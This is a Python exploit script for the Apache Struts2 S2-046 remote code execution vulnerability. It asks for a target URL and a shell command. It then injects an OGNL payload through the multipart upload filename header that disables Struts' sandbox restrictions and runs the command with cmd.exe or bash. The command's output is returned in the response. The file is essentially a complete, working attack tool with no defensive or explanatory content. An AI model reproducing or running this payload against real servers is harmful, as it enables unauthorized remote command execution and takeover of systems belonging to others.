#!/usr/bin/env python
#-*- coding:utf-8 -*-
#Strutrs2-046 RCE exp
__author__ = '@S4kur4'
name = "   _____ _              _       ___  \n"\
       "  / ____| |            | |     |__ \ \n"\
       " | (___ | |_ _ __ _   _| |_ ___   ) |\n"\
       "  \___ \| __| '__| | | | __/ __| / / \n"\
       "  ____) | |_| |  | |_| | |_\__ \/ /_ \n"\
       " |_____/ \__|_|   \__,_|\__|___/____|EXP\n"\
       "                                       "

import urllib2
import sys
import optparse

data = []
boundary = "---------------------------735323031399963166993862150"

header = {
    "User-Agent" : "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:46.0) Gecko/20100101 Firefox/46.0",
    "Connection" : "close",
    "Accept" : "*/*",
    "X-Requested-With" : "XMLHttpRequest",
    "Accept-Encoding" : "deflate",
    "Accept-Language" : "zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4",
    "Content-Length" : "10000000",
    "Content-Type" : "multipart/form-data; boundary=%s" % boundary,
    }

def main():
    print name
    parser = optparse.OptionParser('usage: %prog [options]')
    parser.add_option('-u', '--url', dest='target_url', type='string', help='specify target URL')
    (options, args) = parser.parse_args()
    if options.target_url==None:
        parser.print_help()
        sys.exit(0)
    else:
        target_url = options.target_url
    target_url = target_url.rstrip('/')
    command = raw_input("Input command:")
    payload = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='" + command + "').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\0b"
    data.append("--%s" % boundary)
    data.append("Content-Disposition: form-data; name=\"foo\"; filename=\"%s\"\r\n" % payload)
    data.append("Content-Type: text/palin")
    data.append("--%s--\r\n" % boundary)
    data.append("Boom\r\n")
    try:
        request = urllib2.Request(target_url,data='\r\n'.join(data),headers=header)
        response = urllib2.urlopen(request)
        print response.read()
    except Exception, e:
        print "\033[1;31mUnsuccessful,maybe no vulnerable.\033[0m"

if __name__ == '__main__':
    main()